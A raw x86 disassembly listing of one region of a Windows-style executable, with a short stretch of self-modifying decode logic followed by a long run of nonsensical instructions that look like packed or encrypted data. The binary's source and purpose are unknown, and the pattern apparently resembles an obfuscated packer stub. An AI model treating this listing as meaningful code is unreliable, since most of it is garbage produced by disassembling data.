  403855:	mov    ecx,DWORD PTR [ebp-0x10]
  403858:	xor    ecx,esi
  40385a:	mov    eax,0xffcd8d25
  40385f:	sub    eax,ecx
  403861:	add    DWORD PTR [ebp-0xc],eax
  403864:	mov    eax,DWORD PTR [ebp-0xc]
  403867:	mov    ecx,DWORD PTR [ebp-0x8]
  40386a:	mov    ecx,DWORD PTR [ecx]
  40386c:	mov    ecx,DWORD PTR [ecx]
  40386e:	mov    ecx,DWORD PTR [ecx]
  403870:	mov    DWORD PTR [ecx+0x1],eax
  403873:	mov    al,BYTE PTR [ebp-0x1]
  403876:	mov    ecx,DWORD PTR [ebp-0x8]
  403879:	mov    ecx,DWORD PTR [ecx]
  40387b:	mov    ecx,DWORD PTR [ecx]
  40387d:	mov    ecx,DWORD PTR [ecx]
  40387f:	push   DWORD PTR [ebp-0x2c]
  403882:	xor    al,0x6f
  403884:	sub    al,0xd
  403886:	mov    BYTE PTR [ecx],al
  403888:	jmp    0x405c4a
  40388d:	lods   eax,DWORD PTR ds:[esi]
  40388e:	mov    bh,0xe6
  403890:	ja     0x403876
  403892:	mov    ds:0xa508636b,eax
  403897:	fsub   QWORD PTR fs:[ebx-0x22cb66f5]
  40389e:	pop    edi
  40389f:	bound  esp,QWORD PTR [edx-0x23]
  4038a2:	pop    edi
  4038a3:	bound  esp,QWORD PTR [edx+0x79]
  4038a6:	pop    ebx
  4038a7:	pop    ecx
  4038a8:	and    al,0x83
  4038aa:	js     0x40388a
  4038ac:	pushf  
  4038ad:	mov    ds:0xacfe68c7,al
  4038b2:	mov    DWORD PTR [ebp+esi*2-0x30],ebp
  4038b6:	cs (bad) 
  4038b8:	retf   
  4038b9:	pop    ds
  4038ba:	mov    eax,DWORD PTR [edx]
  4038bc:	pop    eax
  4038bd:	fs (bad) 
  4038bf:	cld    
  4038c0:	ret    0x49d3
  4038c3:	cwde   
  4038c4:	fsub   DWORD PTR [esi+0x34e01125]
  4038ca:	mov    edi,esi
  4038cc:	or     BYTE PTR [edi],0x97
  4038cf:	sbb    al,0xe5
  4038d1:	xchg   edi,edi
  4038d3:	mov    eax,0x3ffac4ea
  4038d8:	sbb    ch,ch
  4038da:	dec    esp
  4038db:	pop    ss
  4038dc:	fdivrp st(2),st
  4038de:	out    dx,al
  4038df:	loopne 0x403922
  4038e1:	scas   al,BYTE PTR es:[edi]
  4038e2:	dec    ecx
  4038e3:	ins    BYTE PTR es:[edi],dx
  4038e4:	int3   
  4038e5:	pop    ebp
  4038e6:	imul   ebp,DWORD PTR [esi+0x6f],0xb0f8d8f7
  4038ed:	dec    edx
  4038ee:	test   al,0xda
  4038f0:	jg     0x403895
  4038f2:	bnd je 0x40392b
  4038f5:	dec    ebp
  4038f6:	xchg   ebp,eax
  4038f7:	sub    ah,BYTE PTR [ecx-0x66]
  4038fa:	and    ebp,DWORD PTR [edx]
  4038fc:	(bad)  
  4038fd:	jo     0x403922
  4038ff:	jbe    0x40392d
  403901:	scas   al,BYTE PTR es:[edi]
  403902:	mov    ebx,0x3d1a48ec
  403907:	enter  0x8359,0xf9
  40390b:	aaa    
  40390c:	jmp    0x13c0:0x874e1edf
  403913:	sbb    BYTE PTR [ebp-0x4d],ah
  403916:	femms  
  403918:	or     al,0x33
  40391a:	rcr    DWORD PTR [ecx+0x5f1a3677],cl
  403920:	fiadd  DWORD PTR [edx]
  403922:	jg     0x4038da
  403924:	mov    dl,0xee
  403926:	jne    0x4038b5
  403928:	leave  
  403929:	int3   
  40392a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40392c:	aad    0x4f
  40392e:	and    eax,0x729d82a
  403933:	sbb    bl,cl
  403935:	xor    al,0xe3
  403937:	jb     0x4039a5
  403939:	or     ch,BYTE PTR [edx]
  40393b:	not    DWORD PTR [eax+0x222e24bc]
  403941:	scas   eax,DWORD PTR es:[edi]
  403942:	ins    BYTE PTR es:[edi],dx
  403943:	repnz into 
  403945:	imul   edi,esi,0xb67ea7d7
  40394b:	outs   dx,DWORD PTR ds:[esi]
  40394c:	fsub   QWORD PTR [esi-0x38dba2fe]
  403952:	push   es
  403953:	jl     0x403950
  403955:	arpl   WORD PTR [ebx+0x644f9928],bp
  40395b:	retf   0x1d29
  40395e:	mov    ebx,0x2b6e154b
  403963:	aam    0xfa
  403965:	jo     0x403983
  403967:	mov    edx,0xfca0f214
  40396c:	and    ebp,DWORD PTR [edi+esi*4-0x36623c3f]
  403973:	fs stos DWORD PTR es:[edi],eax
  403975:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403976:	mov    ebx,0x6f5cbf3b
  40397b:	push   ebx
  40397c:	pop    ebx
  40397d:	scas   al,BYTE PTR es:[edi]
  40397e:	xor    BYTE PTR [esi-0x28],dl
  403981:	jg     0x403913
  403983:	fcom   QWORD PTR gs:[esi]
  403986:	sbb    esp,DWORD PTR [eax+0x37]
  403989:	dec    eax
  40398a:	(bad)  
  40398b:	stc    
  40398c:	call   0xc1d3b67b
  403991:	fs sar ebx,1
  403994:	bound  eax,QWORD PTR ds:0x45b686d4
  40399a:	sub    esi,edi
  40399c:	fiadd  DWORD PTR [ebx+edi*4+0x17]
  4039a0:	mov    DWORD PTR [edx],esi
  4039a2:	sbb    al,BYTE PTR [esi+0x6aee9469]
  4039a8:	and    ecx,DWORD PTR [ebx+ecx*1+0x7d956d3f]
  4039af:	ja     0x4039d3
  4039b1:	in     al,0x54
  4039b3:	sub    eax,0x9ebe9f9a
  4039b8:	mov    ch,0xe8
  4039ba:	inc    BYTE PTR [ebx+0x30f36746]
  4039c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039c1:	cld    
  4039c2:	sub    al,0xaf
  4039c4:	xor    dl,dh
  4039c6:	cmc    
  4039c7:	pop    ebx
  4039c8:	clc    
  4039c9:	in     eax,0xc
  4039cb:	xchg   ebp,eax
  4039cc:	test   DWORD PTR [ecx-0x48],0x8f3f21dc
  4039d3:	cli    
  4039d4:	sbb    eax,0x7a0b88f0
  4039d9:	mov    al,ds:0xa1c12236
  4039de:	repnz mov cs,WORD PTR [edx+edi*4]
  4039e2:	and    al,0x18
  4039e4:	xlat   BYTE PTR ds:[ebx]
  4039e5:	sub    ebx,ebp
  4039e7:	scas   eax,DWORD PTR es:[edi]
  4039e8:	push   0xffffffdc
  4039ea:	sub    BYTE PTR [ecx],dl
  4039ec:	ret    0x410b
  4039ef:	adc    esi,ecx
  4039f1:	sub    BYTE PTR [esi],dh
  4039f3:	and    eax,0xb5ad11e9
  4039f8:	leave  
  4039f9:	jmp    0x39e1:0x65a35e7a
  403a00:	ja     0x4039b8
  403a02:	dec    eax
  403a03:	mov    cl,0x75
  403a05:	jmp    0x5103fafe
  403a0a:	mov    al,0x2c
  403a0c:	in     eax,dx
  403a0d:	es aam 0x1b
  403a10:	pop    edi
  403a11:	mov    ecx,DWORD PTR [ebx-0x6abfde25]
  403a17:	xor    al,bh
  403a19:	cmp    esp,esi
  403a1b:	mov    ds:0x6f57bfd0,al
  403a20:	sbb    DWORD PTR [ecx],0xfffffff0
  403a23:	imul   esp,esi,0x4c
  403a26:	pop    esp
  403a27:	xor    bl,bh
  403a29:	enter  0x7f75,0x19
  403a2d:	aad    0x1
  403a2f:	stc    
  403a30:	nop
  403a31:	jnp    0x403a52
  403a33:	dec    esi
  403a34:	cmp    esi,DWORD PTR [esi+0x1e]
  403a37:	fild   QWORD PTR [ecx]
  403a39:	mov    esi,0xbc015a02
  403a3e:	popaw  
  403a40:	stos   DWORD PTR es:[edi],eax
  403a41:	add    DWORD PTR [esi],ebp
  403a43:	add    DWORD PTR [edi+0x58b1976f],esi
  403a49:	jno    0x4039d8
  403a4b:	mov    ah,0x35
  403a4d:	cmp    DWORD PTR [edx+0x4b32d189],ecx
  403a53:	push   eax
  403a54:	out    0xc4,al
  403a56:	inc    ecx
  403a57:	dec    ecx
  403a58:	dec    esp
  403a59:	adc    esi,DWORD PTR [edi+0x6126a57a]
  403a5f:	xchg   DWORD PTR [edx],ebx
  403a61:	mov    ah,0x9e
  403a63:	imul   ah
  403a65:	and    al,0x64
  403a67:	mov    ch,0x47
  403a69:	mov    ch,0xa5
  403a6b:	mov    ds:0x2a95cfae,eax
  403a70:	out    dx,eax
  403a71:	push   0xffffff82
  403a73:	jecxz  0x403a94
  403a75:	push   esi
  403a76:	mov    cs,WORD PTR [eax]
  403a78:	in     al,0xbd
  403a7a:	ins    BYTE PTR es:[edi],dx
  403a7b:	push   ebx
  403a7c:	pop    ebp
  403a7d:	sbb    al,0x19
  403a7f:	fisttp WORD PTR [ecx+0x22f99ff4]
  403a85:	mov    eax,ds:0x58bb1bad
  403a8a:	out    dx,al
  403a8b:	cmp    ah,BYTE PTR [ebx-0x657e6971]
  403a91:	stos   DWORD PTR es:[edi],eax
  403a92:	mov    edx,0xb0a5a22e
  403a97:	mov    eax,ds:0x608ea50d
  403a9c:	or     al,0xc5
  403a9e:	mov    esp,0x2326a4d6
  403aa3:	xor    cl,ah
  403aa5:	jle    0x403aad
  403aa7:	out    0x1c,eax
  403aa9:	fs add al,0x77
  403aac:	sbb    al,0x85
  403aae:	push   esp
  403aaf:	int3   
  403ab0:	cdq    
  403ab1:	adc    eax,DWORD PTR [esi-0x55]
  403ab4:	or     DWORD PTR [edx],ecx
  403ab6:	push   ebx
  403ab7:	(bad)  
  403ab8:	lock jae 0x403ae0
  403abb:	sbb    ebp,DWORD PTR [esi]
  403abd:	and    DWORD PTR [ebp+0x2a2c2457],ecx
  403ac3:	adc    dl,BYTE PTR [eax-0x30]
  403ac6:	inc    ebx
  403ac7:	aam    0x89
  403ac9:	arpl   WORD PTR [ebx-0x4bf88d35],si
  403acf:	packuswb mm0,mm1
  403ad2:	adc    ecx,DWORD PTR [edx]
  403ad4:	retf   0x4afe
  403ad7:	mov    edi,DWORD PTR [ecx-0x41]
  403ada:	lds    ebp,FWORD PTR [edi+0x7b]
  403add:	push   cs
  403ade:	mov    BYTE PTR [eax],dh
  403ae0:	cmp    DWORD PTR [edi+eax*1-0x357b8cdf],edx
  403ae7:	inc    ebp
  403ae8:	add    eax,0x2400458a
  403aed:	xor    BYTE PTR [edx-0x5d1b6f23],bl
  403af3:	sbb    al,BYTE PTR [esi]
  403af5:	(bad)  
  403af6:	adc    al,0xd1
  403af8:	int    0x22
  403afa:	ss xor eax,0x7fac2df8
  403b00:	cmp    BYTE PTR [edx],0x2b
  403b03:	or     DWORD PTR [ebp-0x1cfe1e0b],edi
  403b09:	xchg   ebp,eax
  403b0a:	std    
  403b0b:	idiv   BYTE PTR [ebx]
  403b0d:	int    0x5c
  403b0f:	xchg   edx,eax
  403b10:	out    0xd3,al
  403b12:	jbe    0x403b78
  403b14:	arpl   WORD PTR [eax+0x7d],bx
  403b17:	ds out dx,eax
  403b19:	popf   
  403b1a:	add    bl,BYTE PTR [esi-0x4c885658]
  403b20:	sti    
  403b21:	retf   
  403b22:	mov    dh,0xd2
  403b24:	(bad)  [ecx+esi*2-0x1f54d110]
  403b2b:	mov    dh,0xab
  403b2d:	mov    ds:0xc70a0d8d,al
  403b32:	icebp  
  403b33:	leave  
  403b34:	jo     0x403b5a
  403b36:	dec    eax
  403b37:	or     al,0x89
  403b39:	rol    DWORD PTR [eax+ebp*4+0x3f],cl
  403b3d:	out    dx,eax
  403b3e:	mov    ebx,0x6903bc63
  403b43:	fcomp  DWORD PTR [edi]
  403b45:	fcomp  DWORD PTR [edx]
  403b47:	push   0x38d4f18e
  403b4c:	inc    eax
  403b4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b4e:	jl     0x403b9f
  403b50:	les    ecx,FWORD PTR [ecx+0x506ae37d]
  403b56:	adc    dl,BYTE PTR [esp+edx*2]
  403b59:	mov    dh,0x64
  403b5b:	mov    edx,0x14b9ab97
  403b60:	mov    al,ds:0x9c50da95
  403b65:	add    esi,ecx
  403b67:	xchg   ecx,eax
  403b68:	dec    ebp
  403b69:	sbb    edx,DWORD PTR [ebx]
  403b6b:	jge    0x403bb8
  403b6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b6e:	jno    0x403b10
  403b70:	jmp    FWORD PTR ds:0x3850d593
  403b76:	mov    ds:0x46be409b,al
  403b7b:	test   edi,ebx
  403b7d:	jns    0x403b41
  403b7f:	xchg   DWORD PTR [ecx-0x63dcf8e5],ebp
  403b85:	scas   al,BYTE PTR es:[edi]
  403b86:	repnz dec esi
  403b88:	xchg   esp,eax
  403b89:	mov    ecx,0xbcea59e8
  403b8e:	add    eax,0x1c29e90b
  403b93:	shr    BYTE PTR [esi-0x6c],0xb2
  403b97:	clc    
  403b98:	bound  esi,QWORD PTR es:[eax+0x33c623c8]
  403b9f:	dec    ecx
  403ba0:	outs   dx,DWORD PTR ds:[esi]
  403ba1:	and    al,0xaa
  403ba3:	int3   
  403ba4:	cmp    ebp,esi
  403ba6:	stc    
  403ba7:	std    
  403ba8:	or     DWORD PTR [esp+edi*2],ecx
  403bab:	mov    ds:0xe9ebd587,al
  403bb0:	sbb    edi,DWORD PTR [edi]
  403bb2:	xchg   esp,eax
  403bb3:	in     al,0xb2
  403bb5:	lods   al,BYTE PTR ds:[esi]
  403bb6:	das    
  403bb7:	ror    esp,0xff
  403bba:	sti    
  403bbb:	rol    BYTE PTR [ecx-0x54432692],0xc2
  403bc2:	nop
  403bc3:	inc    ecx
  403bc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bc5:	sbb    BYTE PTR [ebx+0x52],al
  403bc8:	enter  0xbacc,0x2b
  403bcc:	jp     0x403bf4
  403bce:	xchg   ebp,eax
  403bcf:	std    
  403bd0:	les    ecx,FWORD PTR [ecx]
  403bd2:	push   ecx
  403bd3:	cmp    al,0x36
  403bd5:	xor    BYTE PTR [edx+esi*2-0x5b84c52],bl
  403bdc:	sub    eax,ebp
  403bde:	addr16 popf 
  403be0:	cld    
  403be1:	pop    ebp
  403be2:	test   bh,bl
  403be4:	sbb    ebx,DWORD PTR [eax-0x28cd39d9]
  403bea:	ror    DWORD PTR [ecx],cl
  403bec:	shr    BYTE PTR [eax-0x791727ea],0xe0
  403bf3:	sar    al,1
  403bf5:	nop
  403bf6:	fstp   TBYTE PTR [edi+edx*4]
  403bf9:	add    al,0x77
  403bfb:	push   edx
  403bfc:	add    bl,al
  403bfe:	adc    al,0xc4
  403c00:	jl     0x403c3a
  403c02:	or     BYTE PTR [esi+0x3bacebb0],dh
  403c08:	fild   DWORD PTR [edx+0x603539f]
  403c0e:	daa    
  403c0f:	pop    es
  403c10:	call   0xde69a789
  403c15:	add    DWORD PTR [ebp+0x1d],ebx
  403c18:	pop    ecx
  403c19:	jb     0x403ba9
  403c1b:	(bad)  
  403c1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c1d:	ss and eax,0xe81bd71f
  403c23:	mov    ds:0x23cf6044,al
  403c28:	mov    eax,ds:0x55e9bbaa
  403c2d:	in     eax,dx
  403c2e:	jge    0x403c21
  403c30:	out    dx,eax
  403c31:	data16 das 
  403c33:	or     eax,0xe07967da
  403c38:	outs   dx,BYTE PTR ds:[esi]
  403c39:	and    edx,0x99d1b67e
  403c3f:	and    al,0xa1
  403c41:	std    
  403c42:	jnp    0x403bfa
  403c44:	jbe    0x403c78
  403c46:	adc    BYTE PTR [edi],0x7f
  403c49:	out    0x54,al
  403c4b:	xchg   esp,eax
  403c4c:	mov    gs,WORD PTR [edi-0x33]
  403c4f:	cmc    
  403c50:	(bad)  
  403c51:	retf   
  403c52:	icebp  
  403c53:	xchg   edi,eax
  403c54:	mov    ebp,0xc7aff090
  403c59:	rcl    esi,cl
  403c5b:	xor    bh,0xca
  403c5e:	jns    0x403c37
  403c60:	pop    ebx
  403c61:	fistp  WORD PTR [bx-0x1f]
  403c65:	push   cs
  403c66:	dec    esp
  403c67:	mov    esp,0x6c748f50
  403c6c:	xchg   ebp,eax
  403c6d:	pop    ss
  403c6e:	rol    ecx,0xab
  403c71:	lods   eax,DWORD PTR ds:[esi]
  403c72:	mov    edx,0x60dc6640
  403c77:	and    eax,0xa2fbec37
  403c7c:	les    edx,FWORD PTR [eax+ebx*8-0x40]
  403c80:	or     ah,BYTE PTR [ecx+0x2bc37577]
  403c86:	popa   
  403c87:	std    
  403c88:	in     eax,dx
  403c89:	mov    gs,WORD PTR [esi+0x2e95cfee]
  403c8f:	popa   
  403c90:	mov    eax,ds:0x3d2e57be
  403c95:	sar    DWORD PTR [ecx+0x784b3954],0x9f
  403c9c:	lds    eax,FWORD PTR [eax+0x7c]
  403c9f:	xchg   ebx,eax
  403ca0:	jno    0x403c7e
  403ca2:	pop    es
  403ca3:	cwde   
  403ca4:	xchg   BYTE PTR [ebp-0x4b],ch
  403ca7:	or     al,0x91
  403ca9:	or     DWORD PTR [ecx],0x3c83eddd
  403caf:	cli    
  403cb0:	stc    
  403cb1:	repz mov dl,0x3b
  403cb4:	inc    esi
  403cb5:	sbb    edi,DWORD PTR [esi-0x44ed1476]
  403cbb:	arpl   cx,sp
  403cbd:	and    BYTE PTR [edx],ch
  403cbf:	cmp    al,0x61
  403cc1:	mov    ds:0xab950f1a,eax
  403cc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cc7:	cmp    eax,0x531d9ba9
  403ccc:	push   edx
  403ccd:	or     DWORD PTR es:[ebx],edx
  403cd0:	push   ds
  403cd1:	xchg   ebx,eax
  403cd2:	scas   eax,DWORD PTR es:[edi]
  403cd3:	retf   
  403cd4:	lahf   
  403cd5:	nop
  403cd6:	mov    al,0x8e
  403cd8:	aam    0x37
  403cda:	rcl    DWORD PTR [ebp+0x49],cl
  403cdd:	nop
  403cde:	in     al,0x35
  403ce0:	js     0x403ccd
  403ce2:	test   al,0x43
  403ce4:	dec    eax
  403ce5:	add    ecx,DWORD PTR [ecx-0x12181aa2]
  403ceb:	mov    ds:0xa637ed8a,eax
  403cf0:	mov    cl,0x82
  403cf2:	jbe    0x403c9f
  403cf4:	and    eax,0x518d73a6
  403cf9:	sbb    DWORD PTR [eax+0x57],esp
  403cfc:	fmul   QWORD PTR [eax-0x29]
  403cff:	adc    edi,eax
  403d01:	outs   dx,BYTE PTR ds:[esi]
  403d02:	aad    0xeb
  403d04:	mov    esi,0x3993766d
  403d09:	scas   eax,DWORD PTR es:[edi]
  403d0a:	xor    al,0xce
  403d0c:	stos   BYTE PTR es:[edi],al
  403d0d:	retf   
  403d0e:	pop    eax
  403d0f:	and    al,0x9b
  403d11:	push   cs
  403d12:	fmulp  st(7),st
  403d14:	inc    ebp
  403d15:	into   
  403d16:	and    ecx,0xe639036c
  403d1c:	jnp    0x403c9f
  403d1e:	cmp    BYTE PTR [eax+ebp*4],0xa
  403d22:	add    DWORD PTR [ebp-0x71],ebp
  403d25:	push   eax
  403d26:	rol    DWORD PTR [edx+0x4c6119a6],0xe6
  403d2d:	sub    al,0xd9
  403d2f:	jbe    0x403d36
  403d31:	repnz pop es
  403d33:	sbb    BYTE PTR [esp+eax*1+0x22],ah
  403d37:	arpl   sp,dx
  403d39:	sti    
  403d3a:	jnp    0x403cdb
  403d3c:	shl    BYTE PTR [esi+eax*4-0x3e],0xc9
  403d41:	dec    edx
  403d42:	sti    
  403d43:	fucomi st,st(3)
  403d45:	pop    ebx
  403d46:	push   ds
  403d47:	mov    al,cs:0x20880377
  403d4d:	xchg   esp,eax
  403d4e:	mov    ds:0x240b0042,eax
  403d53:	xchg   esi,eax
  403d54:	jl     0x403d48
  403d56:	add    cl,al
  403d58:	lods   al,BYTE PTR ds:[esi]
  403d59:	retf   0xe750
  403d5c:	xchg   ecx,eax
  403d5d:	mov    ds,WORD PTR [edi+0x4]
  403d60:	push   esi
  403d61:	pop    ebx
  403d62:	mov    bl,0xa
  403d64:	mov    fs,WORD PTR [edx-0x1]
  403d67:	cmp    BYTE PTR [ecx-0x62dd278],ah
  403d6d:	cs dec esp
  403d6f:	xchg   ebp,eax
  403d70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d71:	arpl   ax,bp
  403d73:	lods   al,BYTE PTR ds:[esi]
  403d74:	rcr    DWORD PTR [esp+edx*8-0x73],cl
  403d78:	fiadd  WORD PTR [edi-0x3a30e745]
  403d7e:	xchg   ebx,eax
  403d7f:	sub    cl,BYTE PTR ds:0x52d5a01e
  403d85:	retf   
  403d86:	in     al,dx
  403d87:	add    eax,0x7986b32
  403d8c:	sbb    al,BYTE PTR [edx+0x3c4f2b7b]
  403d92:	mov    ah,0x10
  403d94:	mov    es,eax
  403d96:	and    DWORD PTR [ecx+0x54234b7d],ebx
  403d9c:	cmp    edx,DWORD PTR [ebx+0x77c8464a]
  403da2:	add    esp,ecx
  403da4:	call   0x20e055ea
  403da9:	in     eax,dx
  403daa:	mov    esp,DWORD PTR [ebp+0x3c6ab6de]
  403db0:	adc    dh,BYTE PTR [ecx-0xd]
  403db3:	jb     0x403da1
  403db5:	jg     0x403d79
  403db7:	jno    0x403df6
  403db9:	add    ebx,DWORD PTR [edx+0xb2d9da6]
  403dbf:	shr    BYTE PTR [ebx-0x43863b63],0x1f
  403dc6:	hlt    
  403dc7:	neg    BYTE PTR [ebx+0x26]
  403dca:	or     eax,0xd900e1c
  403dcf:	pop    edi
  403dd0:	cmp    esi,eax
  403dd2:	sbb    BYTE PTR [ebp+0x6151c9dc],ah
  403dd8:	push   ds
  403dd9:	xlat   BYTE PTR ds:[ebx]
  403dda:	push   0xb7dca55c
  403ddf:	jp     0x403db2
  403de1:	push   ds
  403de2:	pop    es
  403de3:	adc    DWORD PTR [esi+0xc],edi
  403de6:	xchg   DWORD PTR ds:0x25271cac,ecx
  403dec:	cmc    
  403ded:	jb     0x403dfa
  403def:	mov    esi,0xa552a873
  403df4:	or     BYTE PTR [ecx+0x1d0754e1],bl
  403dfa:	mov    ah,0xbf
  403dfc:	pop    ebp
  403dfd:	adc    al,0x3e
  403dff:	pop    es
  403e00:	in     eax,0x29
  403e02:	sbb    BYTE PTR [edi-0xa],al
  403e05:	(bad)  
  403e06:	push   0xb12f1d2d
  403e0b:	push   ecx
  403e0c:	jg     0x403e51
  403e0e:	xchg   esp,eax
  403e0f:	fild   WORD PTR [eax+0x210a2664]
  403e15:	push   edi
  403e16:	xor    BYTE PTR [ecx],dh
  403e18:	mov    DWORD PTR [ebp+0x2],ebp
  403e1b:	dec    edx
  403e1c:	cmp    bh,BYTE PTR [eax+0x41]
  403e1f:	cli    
  403e20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e21:	cmp    edx,esi
  403e23:	outs   dx,DWORD PTR ds:[esi]
  403e24:	sub    esi,DWORD PTR [ebx+0x3f0b3b6f]
  403e2a:	test   DWORD PTR [esi-0x16c89d32],esi
  403e30:	jno    0x403eb1
  403e32:	add    DWORD PTR [edx],eax
  403e34:	push   edx
  403e35:	(bad)  
  403e36:	inc    eax
  403e37:	pusha  
  403e38:	or     dh,BYTE PTR [ebx-0x76a7bfa]
  403e3e:	mov    DWORD PTR [ebx+0x6b],ecx
  403e41:	popa   
  403e42:	ss sub eax,0x1aff5625
  403e48:	mov    edx,0x9e66d020
  403e4d:	es pusha 
  403e4f:	loope  0x403ebc
  403e51:	sub    esp,DWORD PTR [edi]
  403e53:	(bad)  
  403e54:	xlat   BYTE PTR ds:[ebx]
  403e55:	inc    edx
  403e56:	and    al,0xa1
  403e58:	mov    ebp,0x9e8afd95
  403e5d:	xor    al,0xdb
  403e5f:	sub    eax,0xe10c08d5
  403e64:	shr    BYTE PTR [esi-0x3cd51062],cl
  403e6a:	and    bl,BYTE PTR [eax+esi*2+0xaec2787]
  403e71:	lea    esi,[edx+0x25]
  403e74:	mov    esp,0x4aeb080
  403e79:	push   es
  403e7a:	jb     0x403eac
  403e7c:	mov    ebp,0x1660d56a
  403e81:	jp     0x403ec1
  403e83:	mov    eax,ds:0xab94b08e
  403e88:	mov    ch,0x40
  403e8a:	stos   BYTE PTR es:[edi],al
  403e8b:	outs   dx,DWORD PTR ds:[esi]
  403e8c:	call   0xce602bb7
  403e91:	ror    ebp,1
  403e93:	call   0xc3c4:0x56a72e99
  403e9a:	jns    0x403f00
  403e9c:	xchg   ebx,eax
  403e9d:	xor    ecx,edi
  403e9f:	outs   dx,BYTE PTR ds:[esi]
  403ea0:	jmp    0x403edc
  403ea2:	add    ebp,DWORD PTR [edi]
  403ea4:	sub    eax,0xb62c615
  403ea9:	loopne 0x403e66
  403eab:	clc    
  403eac:	repz aaa 
  403eae:	mov    ds:0xd3490396,al
  403eb3:	adc    BYTE PTR [esi],0x24
  403eb6:	pop    ecx
  403eb7:	std    
  403eb8:	sub    eax,0x895dbd9f
  403ebd:	push   ebp
  403ebe:	cmp    bl,BYTE PTR [esi+edx*2]
  403ec1:	call   0x4be2:0x158b3da3
  403ec8:	fs out dx,al
  403eca:	push   ebp
  403ecb:	xor    BYTE PTR [ecx+ebp*1-0x5b],ah
  403ecf:	loop   0x403f4c
  403ed1:	jbe    0x403e99
  403ed3:	xor    DWORD PTR [edi],ebp
  403ed5:	add    eax,0xbe380179
  403eda:	and    edx,DWORD PTR [esi]
  403edc:	push   edx
  403edd:	mov    ah,0xd8
  403edf:	fs ja  0x403e9e
  403ee2:	adc    al,BYTE PTR [eax+0x6e21daa0]
  403ee8:	xor    cl,BYTE PTR [esi-0x6a33e552]
  403eee:	mov    al,0xe7
  403ef0:	ret    0x4298
  403ef3:	mov    dl,0x7d
  403ef5:	rcr    esp,cl
  403ef7:	aam    0xfe
  403ef9:	fist   WORD PTR [ecx+0x12]
  403efc:	push   edx
  403efd:	push   cs
  403efe:	mov    edi,0x83983e35
  403f03:	sbb    eax,0x61dcf89b
  403f08:	pop    ecx
  403f09:	cli    
  403f0a:	jns    0x403ea4
  403f0c:	(bad)  [edi+0x11163e6b]
  403f12:	(bad)  
  403f13:	push   0xffffffd3
  403f15:	icebp  
  403f16:	test   eax,0xb2f85c1f
  403f1b:	aaa    
  403f1c:	inc    ebx
  403f1d:	add    al,0xdc
  403f1f:	pop    esp
  403f20:	stos   BYTE PTR es:[edi],al
  403f21:	aas    
  403f22:	call   0x3220:0x77cce32d
  403f29:	xor    eax,0xa1277873
  403f2e:	stos   DWORD PTR es:[edi],eax
  403f2f:	xor    edi,ebp
  403f31:	cmp    al,0xbf
  403f33:	jne    0x403f29
  403f35:	xchg   esp,eax
  403f36:	xchg   ecx,eax
  403f37:	jae    0x403f6e
  403f39:	dec    esi
  403f3a:	scas   eax,DWORD PTR es:[edi]
  403f3b:	and    eax,eax
  403f3d:	cmp    al,0x8f
  403f3f:	and    edx,ecx
  403f41:	mov    esi,0x2de061ee
  403f46:	jmp    0x3991d87f
  403f4b:	mov    cl,0x6b
  403f4d:	adc    eax,0xbf7a8ab6
  403f52:	or     DWORD PTR [eax],edi
  403f54:	test   DWORD PTR ds:0x97886b36,ebx
  403f5a:	xor    DWORD PTR [edx],0x4fface1f
  403f60:	stos   DWORD PTR es:[edi],eax
  403f61:	push   cs
  403f62:	imul   ebp,DWORD PTR [edx+0xf2969d0],0xffffffd0
  403f69:	mov    ch,0x2c
  403f6b:	cld    
  403f6c:	jns    0x403f81
  403f6e:	dec    DWORD PTR [ebp+0x3c6b0c49]
  403f74:	aam    0x77
  403f76:	jmp    0x399fcd5f
  403f7b:	and    eax,0x140ab595
  403f80:	or     al,0x40
  403f82:	push   esp
  403f83:	and    ch,ah
  403f85:	les    edx,FWORD PTR [edi+0x652b2c89]
  403f8b:	test   edi,edx
  403f8d:	pop    ss
  403f8e:	pop    esi
  403f8f:	out    dx,al
  403f90:	repnz stos BYTE PTR es:[edi],al
  403f92:	or     BYTE PTR [eax],dl
  403f94:	cmp    eax,0xbc7221d2
  403f99:	call   0x7f6:0x508e
  403f9f:	in     al,0x54
  403fa1:	push   edi
  403fa2:	xchg   BYTE PTR [edi+0x46],al
  403fa5:	mov    edx,0x3db1077c
  403faa:	sbb    al,0x2f
  403fac:	into   
  403fad:	jl     0x403f66
  403faf:	sbb    eax,0x2fe1ea59
  403fb4:	push   ebx
  403fb5:	or     ebx,edx
  403fb7:	(bad)  
  403fb8:	and    al,BYTE PTR [ebx]
  403fba:	daa    
  403fbb:	cs pop esp
  403fbd:	bound  esi,QWORD PTR [eax-0x7f]
  403fc0:	outs   dx,BYTE PTR ds:[esi]
  403fc1:	nop
  403fc2:	add    ecx,DWORD PTR [ecx+eiz*4]
  403fc5:	cwde   
  403fc6:	retf   
  403fc7:	out    0x4d,al
  403fc9:	leave  
  403fca:	jb     0x403f88
  403fcc:	inc    esi
  403fcd:	dec    ebx
  403fce:	mov    ch,0xa0
  403fd0:	inc    ebx
  403fd1:	in     al,0xc7
  403fd3:	pop    ecx
  403fd4:	push   esp
  403fd5:	das    
  403fd6:	mov    cl,0xe6
  403fd8:	ja     0x404034
  403fda:	xor    al,0x8e
  403fdc:	aam    0xd2
  403fde:	sahf   
  403fdf:	repnz mov esp,0xdcaed6b5
  403fe5:	into   
  403fe6:	sbb    al,0x73
  403fe8:	xor    BYTE PTR [edi],al
  403fea:	push   edi
  403feb:	xor    DWORD PTR [ebp+0x5ed73388],0x8acaa219
  403ff5:	(bad)  
  403ff6:	in     eax,dx
  403ff7:	sub    DWORD PTR [esi-0x28f8da12],esi
  403ffd:	jae    0x403f98
  403fff:	xchg   DWORD PTR [edx-0xd],edx
  404002:	xchg   esi,eax
  404003:	push   ds
  404004:	push   esp
  404005:	xchg   ecx,eax
  404006:	or     ch,BYTE PTR [edi+esi*1]
  404009:	add    dl,BYTE PTR [edi]
  40400b:	(bad)  
  40400d:	pusha  
  40400e:	xchg   edx,eax
  40400f:	in     al,dx
  404010:	jmp    DWORD PTR [eax+edx*8]
